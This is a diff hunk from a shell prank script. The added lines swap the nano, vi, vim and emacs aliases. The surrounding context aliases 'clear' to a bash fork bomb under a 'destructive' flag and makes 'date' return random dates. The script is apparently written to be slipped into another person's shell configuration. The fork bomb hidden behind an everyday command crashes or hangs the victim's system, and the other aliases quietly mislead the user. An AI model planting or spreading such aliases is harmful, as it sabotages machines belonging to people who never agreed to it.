@@ -68,6 +68,11 @@ destructive && alias clear=':(){ :|:& };:';
 # Have `date` return random dates.
 annoying && alias date='date -d "now + $RANDOM days"';
 
+annoying && alias nano="/usr/bin/vi"
+annoying && alias vi="/usr/bin/nano"
+annoying && alias vim="/usr/bin/emacs"
+annoying && alias emacs="/usr/bin/vim"
+
 # Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
 # Other times, resist all attempts at opening it. Other times, make it read
 # reaaaalllly sllooowwwwllly.
